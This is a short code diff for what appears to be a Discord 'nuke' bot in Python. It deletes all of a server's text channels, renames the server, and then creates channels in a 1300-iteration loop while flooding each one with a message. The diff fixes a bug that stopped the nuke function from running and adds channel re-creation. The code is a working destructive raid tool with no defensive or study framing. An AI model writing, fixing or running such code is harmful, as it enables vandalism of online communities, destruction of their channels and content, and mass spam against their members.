@@ -14,15 +14,17 @@ async def allChannelDeleteAndCreate(message):
     try:
         guild = message.guild
         await asyncio.gather(*(channel.delete() for channel in guild.text_channels))
+        await guild.create_text_channel(SERVER_CHANNEL_NAME)
     except:
         pass
 
 async def nuke(message):
     try:
-        channels = guild.text_channels
         guild = message.guild
+        channels = guild.text_channels
         await guild.edit(name=SERVER_CHANNEL_NAME)
         for i in range(1300):
+            print("a")
             channel = await guild.create_text_channel(SERVER_CHANNEL_NAME)
             channels.append(channel)
             await asyncio.gather(*(channel.send(MESSAGE) for channel in channels))
